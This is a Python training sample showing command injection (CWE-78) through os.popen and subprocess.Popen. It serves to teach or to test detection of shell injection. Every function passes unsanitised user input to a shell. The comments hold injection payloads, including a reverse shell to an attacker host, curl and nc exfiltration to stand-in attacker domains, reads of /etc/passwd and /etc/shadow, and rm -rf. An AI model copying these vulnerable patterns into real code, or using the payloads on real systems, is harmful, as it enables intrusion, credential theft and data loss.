# VULNERABLE: Command Injection via os.popen / subprocess.Popen - Training Sample
# CWE-78: Improper Neutralization of Special Elements used in an OS Command
# Severity: CRITICAL
# Description: popen-family calls with user-controlled strings enable shell injection

import os
import subprocess


# ── os.popen variants ──────────────────────────────────────────────────────────

def read_file_info(filepath):
    """VULNERABLE: os.popen with user-controlled filepath."""
    # VULN: filepath = "/etc/passwd; id" — second command executes
    output = os.popen("file " + filepath).read()
    return output


def word_count(filename):
    """VULNERABLE: wc command via os.popen."""
    # VULN: filename = "x.txt && curl http://c2.attacker.com/$(whoami)"
    return os.popen(f"wc -l {filename}").read()


def get_disk_usage(path):
    """VULNERABLE: du with user path via os.popen."""
    # VULN: path = "/var/www && rm -rf /tmp/*"
    return os.popen("du -sh " + path).read()


def sort_file(filepath, field):
    """VULNERABLE: sort with field index from user input."""
    # VULN: field = "1 | nc attacker.com 4444"
    return os.popen(f"sort -k{field} {filepath}").read()


# ── subprocess.Popen variants ─────────────────────────────────────────────────

def stream_log(logfile):
    """VULNERABLE: Popen with shell=True to tail a log."""
    # VULN: logfile = "/dev/null; bash -i >& /dev/tcp/attacker/4444 0>&1"
    proc = subprocess.Popen(
        "tail -f " + logfile,
        shell=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
    )
    for line in proc.stdout:
        yield line.decode()


def run_build_step(target):
    """VULNERABLE: make target from user via Popen shell=True."""
    # VULN: target = "all; cat /etc/shadow"
    proc = subprocess.Popen(
        f"make {target}",
        shell=True,
        stdout=subprocess.PIPE
    )
    stdout, _ = proc.communicate()
    return stdout.decode()


def transcode_video(input_file, output_format):
    """VULNERABLE: ffmpeg transcoding with shell=True and user params."""
    # VULN: output_format = "mp4; curl http://evil.com/$(id|base64)"
    proc = subprocess.Popen(
        f"ffmpeg -i {input_file} output.{output_format}",
        shell=True
    )
    proc.wait()


def whois_lookup(domain):
    """VULNERABLE: whois via Popen with shell=True."""
    # VULN: domain = "example.com | cat /etc/passwd"
    result = subprocess.Popen(
        "whois " + domain,
        shell=True,
        stdout=subprocess.PIPE
    )
    return result.communicate()[0].decode()


def scan_ports(target, port_range):
    """VULNERABLE: nmap launched via Popen shell=True with two injectable params."""
    # VULN: port_range = "80 --script=http-shellshock"
    proc = subprocess.Popen(
        f"nmap -p {port_range} {target}",
        shell=True,
        stdout=subprocess.PIPE
    )
    out, _ = proc.communicate()
    return out.decode()


def archive_and_send(src_dir, remote):
    """VULNERABLE: Two-stage pipeline with user-controlled endpoints."""
    # VULN: remote = "user@host:/path; id>/tmp/pwned"
    proc = subprocess.Popen(
        f"tar czf - {src_dir} | ssh {remote} 'cat > backup.tar.gz'",
        shell=True
    )
    proc.wait()